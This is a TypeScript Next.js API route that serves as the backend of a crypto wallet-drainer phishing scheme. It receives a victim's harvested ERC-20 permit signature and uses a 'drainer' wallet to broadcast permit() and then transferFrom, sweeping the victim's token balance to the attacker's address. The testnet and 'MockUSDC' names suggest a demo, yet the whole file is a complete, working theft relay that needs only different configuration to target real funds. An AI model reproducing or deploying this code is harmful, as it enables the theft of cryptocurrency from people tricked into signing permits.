import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

// Load environment variables directly from the root .env file whichNext.js automatically handles if placed right. 
// However, since the root `.env` is outside `frontend/`, it's best to rely on standard Next.js env configuration
// But we'll build it to fall back properly or assume process.env is populated since `npm run dev` typically catches `.env.local`.

const abi = [
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
    "function transferFrom(address from, address to, uint256 amount)",
    "function balanceOf(address account) view returns (uint256)"
];

export async function POST(request: Request) {
    try {
        const payload = await request.json();
        const { victimAddress, drainerAddress, drainAmount, deadline, signature } = payload;

        if (!signature) {
            return NextResponse.json({ error: 'Missing Signature Data' }, { status: 400 });
        }

        // Setup the RPC connection and the malicious drainer wallet
        const rpcUrl = process.env.NEXT_PUBLIC_SEPOLIA_RPC_URL || process.env.SEPOLIA_RPC_URL;
        const privateKey = process.env.PRIVATE_KEY;
        const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS || process.env.TOKEN_ADDRESS;

        if (!rpcUrl || !privateKey || !tokenAddress) {
            console.error("[-] API configuration missing required environment variables.");
            return NextResponse.json({ error: 'Server Misconfiguration' }, { status: 500 });
        }

        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const drainerWallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(tokenAddress, abi, drainerWallet);

        console.log(`\n[+] API Route Received Harvested Signature from ${victimAddress}`);
        console.log(`[+] Executing Automated Phishing Relay...`);

        // Decode the raw hex signature
        const sig = ethers.Signature.from(signature);

        // Broadcast the permit transaction
        console.log(`[Step 1/2] Broadcasting Permit Payload...`);
        const permitTx = await token.permit(
            victimAddress,
            drainerAddress,
            drainAmount,
            deadline,
            sig.v,
            sig.r,
            sig.s
        );

        await permitTx.wait();
        console.log(`[✔] Cryptographic signature successfully validated by network (Hash: ${permitTx.hash})`);

        // Broadcast the sweep transaction
        console.log(`[Step 2/2] Automatically draining wallet contents...`);
        const balance = await token.balanceOf(victimAddress);

        if (balance === BigInt(0)) {
            console.log(`[-] Victim balance evaluates to 0 MockUSDC. Extraction terminated safely.`);
            return NextResponse.json({ success: true, message: 'Permitted successfully but victim had 0 balance.' });
        }

        const amountToDrain = BigInt(drainAmount);
        const sweepAmount = balance < amountToDrain ? balance : amountToDrain;

        const sweepTx = await token.transferFrom(victimAddress, drainerAddress, sweepAmount);
        await sweepTx.wait();

        console.log(`[✅ MISSION ACCOMPLISHED] Drained ${ethers.formatUnits(sweepAmount, 6)} MockUSDC perfectly!`);

        return NextResponse.json({ success: true, hash: sweepTx.hash });

    } catch (error: any) {
        console.error(`\n[❌] Automated Relayer Failed:`, error.shortMessage || error.message);
        return NextResponse.json({ error: error.message }, { status: 500 });
    }
}
